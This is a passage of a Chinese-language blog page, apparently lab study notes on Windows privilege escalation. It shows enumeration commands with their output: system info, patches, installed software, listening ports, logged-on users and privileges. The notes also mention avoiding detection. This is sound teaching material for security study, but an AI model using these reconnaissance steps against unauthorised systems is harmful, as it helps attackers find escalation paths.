class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">ComSpec</span>=<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>\<span class="title">cmd.exe</span></span></span><br><span class="line"><span class="function"><span class="title">HOMEDRIVE</span>=<span class="title">C</span>:</span></span><br><span class="line"><span class="function"><span class="title">HOMEPATH</span>=\<span class="title">Users</span>\<span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">LOCALAPPDATA</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">AppData</span>\<span class="title">Local</span></span></span><br><span class="line"><span class="function"><span class="title">LOGONSERVER</span>=\\<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">NUMBER_OF_PROCESSORS</span>=6</span></span><br><span class="line"><span class="function"><span class="title">OS</span>=<span class="title">Windows_NT</span></span></span><br><span class="line"><span class="function"><span class="title">Path</span>=<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>;<span class="title">C</span>:\<span class="title">Windows</span>;<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">Wbem</span>;<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">WindowsPowerShell</span>\<span class="title">v1</span>.0\;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Microsoft</span>\<span class="title">WindowsApps</span>;</span></span><br><span class="line"><span class="function"><span class="title">PATHEXT</span>=.<span class="title">COM</span>;.<span class="title">EXE</span>;.<span class="title">BAT</span>;.<span class="title">CMD</span>;.<span class="title">VBS</span>;.<span class="title">VBE</span>;.<span class="title">JS</span>;.<span class="title">JSE</span>;.<span class="title">WSF</span>;.<span class="title">WSH</span>;.<span class="title">MSC</span></span></span><br><span class="line"><span class="function"><span class="title">PROCESSOR_ARCHITECTURE</span>=<span class="title">AMD64</span></span></span><br><span class="line"><span class="function"><span class="title">PROCESSOR_IDENTIFIER</span>=<span class="title">AMD64</span> <span class="title">Family</span> 23 <span class="title">Model</span> 49 <span class="title">Stepping</span> 0, <span class="title">AuthenticAMD</span></span></span><br><span class="line"><span class="function"><span class="title">PROCESSOR_LEVEL</span>=23</span></span><br><span class="line"><span class="function"><span class="title">PROCESSOR_REVISION</span>=3100</span></span><br><span class="line"><span class="function"><span class="title">ProgramData</span>=<span class="title">C</span>:\<span class="title">ProgramData</span></span></span><br><span class="line"><span class="function"><span class="title">ProgramFiles</span>=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"><span class="title">ProgramFiles</span>(<span class="title">x86</span>)=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)</span></span><br><span class="line"><span class="function"><span class="title">ProgramW6432</span>=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"><span class="title">PROMPT</span>=$<span class="title">P</span>$<span class="title">G</span></span></span><br><span class="line"><span class="function"><span class="title">PSModulePath</span>=<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">WindowsPowerShell</span>\<span class="title">Modules</span>;<span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span>\<span class="title">WindowsPowerShell</span>\<span class="title">v1</span>.0\<span class="title">Modules</span></span></span><br><span class="line"><span class="function"><span class="title">PUBLIC</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Public</span></span></span><br><span class="line"><span class="function"><span class="title">SESSIONNAME</span>=<span class="title">Console</span></span></span><br><span class="line"><span class="function"><span class="title">SystemDrive</span>=<span class="title">C</span>:</span></span><br><span class="line"><span class="function"><span class="title">SystemRoot</span>=<span class="title">C</span>:\<span class="title">Windows</span></span></span><br><span class="line"><span class="function"><span class="title">TEMP</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">ADMINI</span>~1\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Temp</span>\1</span></span><br><span class="line"><span class="function"><span class="title">TMP</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">ADMINI</span>~1\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Temp</span>\1</span></span><br><span class="line"><span class="function"><span class="title">USERDOMAIN</span>=<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">USERDOMAIN_ROAMINGPROFILE</span>=<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">USERNAME</span>=<span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">USERPROFILE</span>=<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">windir</span>=<span class="title">C</span>:\<span class="title">Windows</span> </span></span><br></pre></td></tr></table></figure><h3 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h3><p><code>systeminfo</code> 打印系统信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">systeminfo</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Host</span> <span class="title">Name</span>:                 <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">Name</span>:                   <span class="title">Microsoft</span> <span class="title">Windows</span> <span class="title">Server</span> 2016 <span class="title">Standard</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">Version</span>:                10.0.14393 <span class="title">N</span>/<span class="title">A</span> <span class="title">Build</span> 14393</span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">Manufacturer</span>:           <span class="title">Microsoft</span> <span class="title">Corporation</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">Configuration</span>:          <span class="title">Standalone</span> <span class="title">Server</span></span></span><br><span class="line"><span class="function"><span class="title">OS</span> <span class="title">Build</span> <span class="title">Type</span>:             <span class="title">Multiprocessor</span> <span class="title">Free</span></span></span><br><span class="line"><span class="function"><span class="title">Registered</span> <span class="title">Owner</span>:          <span class="title">Windows</span> <span class="title">User</span></span></span><br><span class="line"><span class="function"><span class="title">Registered</span> <span class="title">Organization</span>:</span></span><br><span class="line"><span class="function"><span class="title">Product</span> <span class="title">ID</span>:                00376-30000-00299-<span class="title">AA303</span></span></span><br><span class="line"><span class="function"><span class="title">Original</span> <span class="title">Install</span> <span class="title">Date</span>:     3/24/2021, 3:46:32 <span class="title">PM</span></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Boot</span> <span class="title">Time</span>:          3/25/2021, 9:24:36 <span class="title">AM</span></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Manufacturer</span>:       <span class="title">VMware</span>, <span class="title">Inc</span>.</span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Model</span>:              <span class="title">VMware7</span>,1</span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Type</span>:               <span class="title">x64</span>-<span class="title">based</span> <span class="title">PC</span></span></span><br><span class="line"><span class="function"><span class="title">Processor</span>(<span class="title">s</span>):              3 <span class="title">Processor</span>(<span class="title">s</span>) <span class="title">Installed</span>.</span></span><br><span class="line"><span class="function">                           [01]: <span class="title">AMD64</span> <span class="title">Family</span> 23 <span class="title">Model</span> 49 <span class="title">Stepping</span> 0 <span class="title">AuthenticAMD</span> ~2994 <span class="title">Mhz</span></span></span><br><span class="line"><span class="function">                           [02]: <span class="title">AMD64</span> <span class="title">Family</span> 23 <span class="title">Model</span> 49 <span class="title">Stepping</span> 0 <span class="title">AuthenticAMD</span> ~2994 <span class="title">Mhz</span></span></span><br><span class="line"><span class="function">                           [03]: <span class="title">AMD64</span> <span class="title">Family</span> 23 <span class="title">Model</span> 49 <span class="title">Stepping</span> 0 <span class="title">AuthenticAMD</span> ~2994 <span class="title">Mhz</span></span></span><br><span class="line"><span class="function"><span class="title">BIOS</span> <span class="title">Version</span>:              <span class="title">VMware</span>, <span class="title">Inc</span>. <span class="title">VMW71</span>.00<span class="title">V</span>.16707776.<span class="title">B64</span>.2008070230, 8/7/2020</span></span><br><span class="line"><span class="function"><span class="title">Windows</span> <span class="title">Directory</span>:         <span class="title">C</span>:\<span class="title">Windows</span></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Directory</span>:          <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">system32</span></span></span><br><span class="line"><span class="function"><span class="title">Boot</span> <span class="title">Device</span>:               \<span class="title">Device</span>\<span class="title">HarddiskVolume2</span></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Locale</span>:             <span class="title">en</span>-<span class="title">us</span>;<span class="title">English</span> (<span class="title">United</span> <span class="title">States</span>)</span></span><br><span class="line"><span class="function"><span class="title">Input</span> <span class="title">Locale</span>:              <span class="title">en</span>-<span class="title">us</span>;<span class="title">English</span> (<span class="title">United</span> <span class="title">States</span>)</span></span><br><span class="line"><span class="function"><span class="title">Time</span> <span class="title">Zone</span>:                 (<span class="title">UTC</span>-08:00) <span class="title">Pacific</span> <span class="title">Time</span> (<span class="title">US</span> &amp; <span class="title">Canada</span>)</span></span><br><span class="line"><span class="function"><span class="title">Total</span> <span class="title">Physical</span> <span class="title">Memory</span>:     6,143 <span class="title">MB</span></span></span><br><span class="line"><span class="function"><span class="title">Available</span> <span class="title">Physical</span> <span class="title">Memory</span>: 3,474 <span class="title">MB</span></span></span><br><span class="line"><span class="function"><span class="title">Virtual</span> <span class="title">Memory</span>: <span class="title">Max</span> <span class="title">Size</span>:  10,371 <span class="title">MB</span></span></span><br><span class="line"><span class="function"><span class="title">Virtual</span> <span class="title">Memory</span>: <span class="title">Available</span>: 7,544 <span class="title">MB</span></span></span><br><span class="line"><span class="function"><span class="title">Virtual</span> <span class="title">Memory</span>: <span class="title">In</span> <span class="title">Use</span>:    2,827 <span class="title">MB</span></span></span><br><span class="line"><span class="function"><span class="title">Page</span> <span class="title">File</span> <span class="title">Location</span>(<span class="title">s</span>):     <span class="title">C</span>:\<span class="title">pagefile.sys</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span>:                    <span class="title">WORKGROUP</span></span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Server</span>:              \\<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">Hotfix</span>(<span class="title">s</span>):                 3 <span class="title">Hotfix</span>(<span class="title">s</span>) <span class="title">Installed</span>.</span></span><br><span class="line"><span class="function">                           [01]: <span class="title">KB3199986</span></span></span><br><span class="line"><span class="function">                           [02]: <span class="title">KB5001078</span></span></span><br><span class="line"><span class="function">                           [03]: <span class="title">KB4103723</span></span></span><br><span class="line"><span class="function"><span class="title">Network</span> <span class="title">Card</span>(<span class="title">s</span>):           2 <span class="title">NIC</span>(<span class="title">s</span>) <span class="title">Installed</span>.</span></span><br><span class="line"><span class="function">                           [01]: <span class="title">Intel</span>(<span class="title">R</span>) 82574<span class="title">L</span> <span class="title">Gigabit</span> <span class="title">Network</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="function">                                 <span class="title">Connection</span> <span class="title">Name</span>: <span class="title">Ethernet0</span></span></span><br><span class="line"><span class="function">                                 <span class="title">DHCP</span> <span class="title">Enabled</span>:    <span class="title">Yes</span></span></span><br><span class="line"><span class="function">                                 <span class="title">DHCP</span> <span class="title">Server</span>:     10.129.0.1</span></span><br><span class="line"><span class="function">                                 <span class="title">IP</span> <span class="title">address</span>(<span class="title">es</span>)</span></span><br><span class="line"><span class="function">                                 [01]: 10.129.43.8</span></span><br><span class="line"><span class="function">                                 [02]: <span class="title">fe80</span>::<span class="title">e4db</span>:5<span class="title">ea3</span>:2775:8<span class="title">d4d</span></span></span><br><span class="line"><span class="function">                                 [03]: <span class="title">dead:beef</span>::<span class="title">e4db</span>:5<span class="title">ea3</span>:2775:8<span class="title">d4d</span></span></span><br><span class="line"><span class="function">                           [02]: <span class="title">vmxnet3</span> <span class="title">Ethernet</span> <span class="title">Adapter</span></span></span><br><span class="line"><span class="function">                                 <span class="title">Connection</span> <span class="title">Name</span>: <span class="title">Ethernet1</span></span></span><br><span class="line"><span class="function">                                 <span class="title">DHCP</span> <span class="title">Enabled</span>:    <span class="title">No</span></span></span><br><span class="line"><span class="function">                                 <span class="title">IP</span> <span class="title">address</span>(<span class="title">es</span>)</span></span><br><span class="line"><span class="function">                                 [01]: 192.168.20.56</span></span><br><span class="line"><span class="function">                                 [02]: <span class="title">fe80</span>::<span class="title">f055:fefd</span>:<span class="title">b1b</span>:9919</span></span><br><span class="line"><span class="function"><span class="title">Hyper</span>-<span class="title">V</span> <span class="title">Requirements</span>:      <span class="title">A</span> <span class="title">hypervisor</span> <span class="title">has</span> <span class="title">been</span> <span class="title">detected</span>. <span class="title">Features</span> <span class="title">required</span> <span class="title">for</span> <span class="title">Hyper</span>-<span class="title">V</span> <span class="title">will</span> <span class="title">not</span> <span class="title">be</span> <span class="title">displayed</span>.</span></span><br></pre></td></tr></table></figure><h3 id="补丁和更新"><a href="#补丁和更新" class="headerlink" title="补丁和更新"></a>补丁和更新</h3><p>如果<code>systeminfo</code>没有显示修补程序，则可以使用带有<a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering">QFE</a>的WMI 命令二进制文件通过<a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page">WMI</a>进行查询以显示补丁。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">qfe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Caption</span>                                     <span class="title">CSName</span>        <span class="title">Description</span>      <span class="title">FixComments</span>  <span class="title">HotFixID</span>   <span class="title">InstallDate</span>  <span class="title">InstalledBy</span>          <span class="title">InstalledOn</span>  <span class="title">Name</span>  <span class="title">ServicePackInEffect</span>  <span class="title">Status</span></span></span><br><span class="line"><span class="function"><span class="title">http</span>://<span class="title">support.microsoft.com</span>/?<span class="title">kbid</span>=3199986  <span class="title">WINLPE</span>-<span class="title">SRV01</span>  <span class="title">Update</span>                        <span class="title">KB3199986</span>               <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span>  11/21/2016</span></span><br><span class="line"><span class="function"><span class="title">https</span>://<span class="title">support.microsoft.com</span>/<span class="title">help</span>/5001078  <span class="title">WINLPE</span>-<span class="title">SRV01</span>  <span class="title">Security</span> <span class="title">Update</span>               <span class="title">KB5001078</span>               <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span>  3/25/2021</span></span><br><span class="line"><span class="function"><span class="title">http</span>://<span class="title">support.microsoft.com</span>/?<span class="title">kbid</span>=4103723  <span class="title">WINLPE</span>-<span class="title">SRV01</span>  <span class="title">Security</span> <span class="title">Update</span>               <span class="title">KB4103723</span>               <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span>  3/25/2021</span></span><br></pre></td></tr></table></figure><p>或者使用 <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1">Get-Hotfix</a> 通过 powershell 查询</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-HotFix</span> | <span class="built_in">ft</span> <span class="literal">-AutoSize</span></span><br><span class="line"></span><br><span class="line">Source       Description     HotFixID  InstalledBy                InstalledOn</span><br><span class="line"><span class="literal">------</span>       <span class="literal">-----------</span>     <span class="literal">--------</span>  <span class="literal">-----------</span>                <span class="literal">-----------</span></span><br><span class="line">WINLPE<span class="literal">-SRV01</span> Update          KB3199986 NT AUTHORITY\SYSTEM        <span class="number">11</span>/<span class="number">21</span>/<span class="number">2016</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> AM</span><br><span class="line">WINLPE<span class="literal">-SRV01</span> Update          KB4054590 WINLPE<span class="literal">-SRV01</span>\Administrator <span class="number">3</span>/<span class="number">30</span>/<span class="number">2021</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> AM</span><br><span class="line">WINLPE<span class="literal">-SRV01</span> Security Update KB5001078 NT AUTHORITY\SYSTEM        <span class="number">3</span>/<span class="number">25</span>/<span class="number">2021</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> AM</span><br><span class="line">WINLPE<span class="literal">-SRV01</span> Security Update KB3200970 WINLPE<span class="literal">-SRV01</span>\Administrator <span class="number">4</span>/<span class="number">13</span>/<span class="number">2021</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">00</span> AM</span><br></pre></td></tr></table></figure><h3 id="安装的应用"><a href="#安装的应用" class="headerlink" title="安装的应用"></a>安装的应用</h3><p>WMI 还可用于显示已安装的软件。这些信息通常可以指导找到难以发现的漏洞。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">product</span> <span class="title">get</span> <span class="title">name</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Name</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X64</span> <span class="title">Additional</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br><span class="line"><span class="function"><span class="title">Java</span> 8 <span class="title">Update</span> 231 (64-<span class="title">bit</span>)</span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X86</span> <span class="title">Additional</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br><span class="line"><span class="function"><span class="title">VMware</span> <span class="title">Tools</span></span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X64</span> <span class="title">Minimum</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br><span class="line"><span class="function"><span class="title">Microsoft</span> <span class="title">Visual</span> <span class="title">C</span>++ 2019 <span class="title">X86</span> <span class="title">Minimum</span> <span class="title">Runtime</span> - 14.24.28127</span></span><br><span class="line"><span class="function"><span class="title">Java</span> <span class="title">Auto</span> <span class="title">Updater</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以使用<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1">Get-WmiObject</a> cmdlet 通过 PowerShell 来执行此操作。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> Win32_Product |  <span class="built_in">select</span> Name, Version</span><br><span class="line"></span><br><span class="line">Name                                                                    Version</span><br><span class="line"><span class="literal">----</span>                                                                    <span class="literal">-------</span></span><br><span class="line">SQL Server <span class="number">2016</span> Database Engine Shared                                  <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">Microsoft OLE DB Driver <span class="keyword">for</span> SQL Server                                  <span class="number">18.3</span>.<span class="number">0.0</span></span><br><span class="line">Microsoft Visual C++ <span class="number">2010</span>  x64 Redistributable - <span class="number">10.0</span>.<span class="number">40219</span>             <span class="number">10.0</span>.<span class="number">40219</span></span><br><span class="line">Microsoft Help Viewer <span class="number">2.3</span>                                               <span class="number">2.3</span>.<span class="number">28107</span></span><br><span class="line">Microsoft Visual C++ <span class="number">2010</span>  x86 Redistributable - <span class="number">10.0</span>.<span class="number">40219</span>             <span class="number">10.0</span>.<span class="number">40219</span></span><br><span class="line">Microsoft Visual C++ <span class="number">2013</span> x86 Minimum Runtime - <span class="number">12.0</span>.<span class="number">21005</span>              <span class="number">12.0</span>.<span class="number">21005</span></span><br><span class="line">Microsoft Visual C++ <span class="number">2013</span> x86 Additional Runtime - <span class="number">12.0</span>.<span class="number">21005</span>           <span class="number">12.0</span>.<span class="number">21005</span></span><br><span class="line">Microsoft Visual C++ <span class="number">2019</span> X64 Additional Runtime - <span class="number">14.28</span>.<span class="number">29914</span>          <span class="number">14.28</span>.<span class="number">29914</span></span><br><span class="line">Microsoft ODBC Driver <span class="number">13</span> <span class="keyword">for</span> SQL Server                                 <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">SQL Server <span class="number">2016</span> Database Engine Shared                                  <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">SQL Server <span class="number">2016</span> Database Engine Services                                <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">SQL Server Management Studio <span class="keyword">for</span> Reporting Services                     <span class="number">15.0</span>.<span class="number">18369.0</span></span><br><span class="line">Microsoft SQL Server <span class="number">2008</span> Setup Support Files                           <span class="number">10.3</span>.<span class="number">5500.0</span></span><br><span class="line">SSMS Post Install Tasks                                                 <span class="number">15.0</span>.<span class="number">18369.0</span></span><br><span class="line">Microsoft VSS Writer <span class="keyword">for</span> SQL Server <span class="number">2016</span>                                <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">Java <span class="number">8</span> Update <span class="number">231</span> (<span class="number">64</span><span class="literal">-bit</span>)                                              <span class="number">8.0</span>.<span class="number">2310.11</span></span><br><span class="line">Browser <span class="keyword">for</span> SQL Server <span class="number">2016</span>                                             <span class="number">13.2</span>.<span class="number">5026.0</span></span><br><span class="line">Integration Services                                                    <span class="number">15.0</span>.<span class="number">2000.130</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="正在运行的进程"><a href="#正在运行的进程" class="headerlink" title="正在运行的进程"></a>正在运行的进程</h3><p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat">netstat</a>命令将显示活动的 TCP 和 UDP 连接，这将使更好地了解哪些服务正在本地和外部可访问的端口上监听。可能会发现只有本地主机可访问的易受攻击的服务（登录到主机时），可以利用它来提升权限。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State           PID</span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">21</span>             <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">1096</span></span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>             <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">135</span>            <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">840</span></span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">445</span>            <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">1433</span>           <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">3520</span></span><br><span class="line">  TCP    <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">3389</span>           <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">0</span>              LISTENING       <span class="number">968</span></span><br><span class="line">&lt;...SNIP...&gt;</span><br></pre></td></tr></table></figure><h2 id="User-Group-Information"><a href="#User-Group-Information" class="headerlink" title="User &amp; Group Information"></a>User &amp; Group Information</h2><p>确定哪些用户登录了系统始终很重要。在规避攻击期间，需要小心谨慎地处理其他用户正在积极工作的主机，以避免被发现。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">query</span> <span class="title">user</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">USERNAME</span>              <span class="title">SESSIONNAME</span>        <span class="title">ID</span>  <span class="title">STATE</span>   <span class="title">IDLE</span> <span class="title">TIME</span>  <span class="title">LOGON</span> <span class="title">TIME</span></span></span><br><span class="line"><span class="function">&gt;<span class="title">administrator</span>         <span class="title">rdp</span>-<span class="title">tcp</span>#2           1  <span class="title">Active</span>          .  3/25/2021 9:27 <span class="title">AM</span></span></span><br></pre></td></tr></table></figure><h3 id="当前用户"><a href="#当前用户" class="headerlink" title="当前用户"></a>当前用户</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">echo</span> %<span class="title">USERNAME</span>%</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">htb</span>-<span class="title">student</span> </span></span><br></pre></td></tr></table></figure><h3 id="当前用户权限"><a href="#当前用户权限" class="headerlink" title="当前用户权限"></a>当前用户权限</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>                <span class="title">Description</span>                    <span class="title">State</span></span></span><br><span class="line"><span class="function">============================= ============================== ========</span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>       <span class="title">Bypass</span> <span class="title">traverse</span> <span class="title">checking</span>       <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseWorkingSetPrivilege</span> <span class="title">Increase</span> <span class="title">a</span> <span class="title">process</span> <span class="title">working</span> <span class="title">set</span> <span 